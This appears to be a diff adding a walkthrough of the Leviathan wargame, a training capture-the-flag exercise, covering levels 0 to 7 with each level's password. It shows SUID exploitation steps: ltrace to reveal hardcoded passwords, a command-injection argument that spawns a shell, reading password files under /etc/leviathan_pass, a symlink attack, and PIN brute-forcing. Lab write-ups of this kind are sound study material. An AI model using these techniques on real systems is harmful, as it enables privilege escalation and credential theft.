@@ -1,0 +1,49 @@
+=== Leviathan Walkthrough (Technical Version) ===
+
+Level 0:
+- Start by listing hidden directories:  
+  `ls -a`  
+- Inspect `.backup/bookmarks.html`.  
+- Search efficiently with:  
+  `cat bookmarks.html | grep -i "password"`  
+  (or search for "leviathan").
+
+Level 1 (Password: 3QJ3TgzHDq):
+- Identify SUID binaries:  
+  `ls -la`  
+- The executable `check` prompts for a password.  
+- Analyze it with:  
+  `ltrace ./check`  
+  Reveals the hardcoded password via `strcmp`.  
+- Spawns a `leviathan2` shell upon success.
+
+Level 2 (Password: NsN1HwFoyN):
+- The SUID `printfile` has a path traversal flaw:
+  1. Create test files: `echo "test" > "/tmp/foo bar"`  
+  2. Run `./printfile "/tmp/foo bar"` → Only processes `/tmp/foo`.  
+- Exploit with command injection:  
+  `./printfile "/tmp/;sh"`  
+  Escalates to `leviathan3`.  
+- Extract password: `cat /etc/leviathan_pass/leviathan3`  
+
+Level 3 (Password: f0n8h2iWLP):
+- The SUID binary uses `strcmp()` for authentication.  
+- Use `ltrace` to find the comparison string ("snlprintf").  
+- Input this to gain `leviathan4` access.  
+
+Level 4 (Password: WG1egElCvO):
+- Execute the SUID to get encoded output.  
+- Decode with CyberChef (From Binary/Hex).  
+
+Level 5 (Password: 0dyxT7F4QD):
+- The program reads `/tmp/file.log` as root.  
+- Leak `leviathan6`'s password via symlink:  
+  `ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log`  
+  Run the binary to reveal credentials.  
+
+Level 6 (Password: szo7HDB88w):
+- Brute-force the 4-digit PIN:  
+  Write a Bash loop (0000-9999) or intercept with `ltrace`.  
+
+Level 7 (Password: qEs5Io5yM8):
+- Completion! All levels conquered.  
